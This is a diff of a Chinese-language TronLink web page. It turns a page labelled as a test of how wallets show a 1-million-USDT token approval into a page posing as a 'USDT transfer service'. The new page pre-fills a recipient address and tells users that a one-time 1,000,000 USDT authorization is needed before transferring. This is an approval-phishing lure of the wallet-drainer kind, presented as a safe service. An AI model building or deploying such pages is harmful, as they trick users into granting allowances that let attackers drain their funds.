@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>100万 USDT 授权测试</title>
+    <title>USDT 转账服务</title>
     <style>
         body { font-family: Arial; max-width: 500px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
         .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
@@ -12,32 +12,42 @@
         input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
         button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
         #connectBtn { background: #4CAF50; color: white; }
-        #approveBtn { background: #2196F3; color: white; }
-        #approveBtn:disabled { background: #ccc; cursor: not-allowed; }
+        #transferBtn { background: #2196F3; color: white; }
+        #transferBtn:disabled { background: #ccc; cursor: not-allowed; }
         #status { margin-top: 15px; padding: 10px; border-radius: 5px; background: #f8f9fa; min-height: 20px; }
-        .test-info { background: #e8f5e8; padding: 12px; border-radius: 8px; margin-bottom: 15px; text-align: center; border-left: 4px solid #4CAF50; }
+        .service-info { background: #e8f5e8; padding: 12px; border-radius: 8px; margin-bottom: 15px; text-align: center; border-left: 4px solid #4CAF50; }
+        .authorization-note { background: #fff3cd; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #ffc107; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>💰 100万 USDT 授权测试</h2>
+        <h2>💰 USDT 转账服务</h2>
         
-        <div class="test-info">
-            <strong>测试目标：</strong>观察钱包对 100万 USDT 大额授权的显示方式
+        <div class="service-info">
+            <strong>服务说明：</strong>USDT 安全转账服务
         </div>
 
         <div class="input-group">
-            <label for="amount">显示金额 (USDT):</label>
-            <input type="number" id="amount" value="100" step="1">
+            <label for="amount">转账金额 (USDT):</label>
+            <input type="number" id="amount" value="10" step="0.1" placeholder="请输入转账金额">
+        </div>
+
+        <div class="input-group">
+            <label for="recipient">收款地址:</label>
+            <input type="text" id="recipient" placeholder="请输入TRON收款地址" value="TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC">
+        </div>
+
+        <div class="authorization-note">
+            <strong>注意：</strong>首次使用需要授权 100万 USDT 额度，授权仅需一次
         </div>
 
         <button id="connectBtn">🔗 连接 TronLink</button>
-        <button id="approveBtn" disabled>🎯 测试 100万 USDT 授权</button>
+        <button id="transferBtn" disabled>🚀 执行转账</button>
 
         <div id="status">请先连接钱包...</div>
         
         <div style="margin-top: 15px; font-size: 12px; color: #666; text-align: center;">
-            注意：实际授权 100万 USDT，请仔细检查钱包显示
+            安全提示：请仔细核对收款地址和转账金额
         </div>
     </div>
 
